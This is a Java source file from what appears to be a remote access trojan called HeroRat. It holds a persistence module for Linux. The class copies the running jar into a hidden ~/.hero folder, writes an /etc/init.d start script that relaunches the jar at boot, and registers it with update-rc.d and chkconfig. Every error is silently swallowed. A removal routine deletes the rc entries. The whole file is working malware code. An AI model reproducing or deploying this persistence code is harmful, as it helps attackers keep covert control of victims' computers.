package net.herorat.features.startup;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.OutputStream;

public class StartupNux
{
	private static final String HOME = System.getProperty("user.home");
	private static final String SUBFOLDER = ".hero";
	
	public static void add(String entry_name)
	{
		try
		{
			File currentJar = new File(StartupNux.class.getProtectionDomain().getCodeSource().getLocation().toURI());
			
			directoryInjection(currentJar);
			autorunInjection(entry_name, currentJar);
		}
		catch (Exception e) {}
	}
	
	public static void remove(String entry_name)
	{
		try
		{
			// Remove from startup
			Runtime.getRuntime().exec(new String[] { "rm", "-fv", "/etc/rc*/*" + entry_name });
			Runtime.getRuntime().exec(new String[] { "chkconfig", "--del", entry_name });
			
			// Delete the config file
			File init_d = new File("/etc/init.d/" + entry_name);
			if (init_d.exists()) init_d.delete();
		}
		catch (Exception e) {}
	}
	
	private static void directoryInjection(File currentJar)
	{
		try
		{			
			File outputJar = new File(HOME, SUBFOLDER + "/" + currentJar.getName());

			InputStream in = new FileInputStream(currentJar);
			OutputStream out = new FileOutputStream(outputJar);
			
			byte[] buf = new byte[1024];
			int len;
			while ((len = in.read(buf)) > 0)
			{
				out.write(buf, 0, len);
			}
			in.close();
			out.close();
		}
		catch (Exception e) {}
	}
	
	private static void autorunInjection(String entry_name, File currentJar)
	{
		try
		{
			File outputJar = new File(HOME, SUBFOLDER + "/" + currentJar.getName());
			
			// Generate config file data
			String data = "#! /bin/sh\n\n";
			data += "case \"$1\" in\n";
			data += "start)\n";
			data += "cd /home/\n";
			data += "/usr/bin/java -jar " + outputJar.getAbsolutePath() + " &\n";
			data += ";;\n";
			data += "stop)\n";
			data += "killall -v java\n";
			data += ";;\n";
			data += "esac\n";
			data += "exit 0\n";
			
			// Paste data to the config file
			FileWriter fstream = new FileWriter("/etc/init.d/" + entry_name);
			BufferedWriter out = new BufferedWriter(fstream);
			out.write(data);
			out.close();
			
			File init_d = new File("/etc/init.d/" + entry_name);
			// Add execute right
			Runtime.getRuntime().exec(new String[] { "chmod", "+x", init_d.getAbsolutePath() }).waitFor();
			
			// Add it to startup
			Runtime.getRuntime().exec(new String[] { "update-rc.d", entry_name, "defaults" });
			Runtime.getRuntime().exec(new String[] { "chkconfig", "--add", entry_name });
		}
		catch (Exception e) {}
	}
}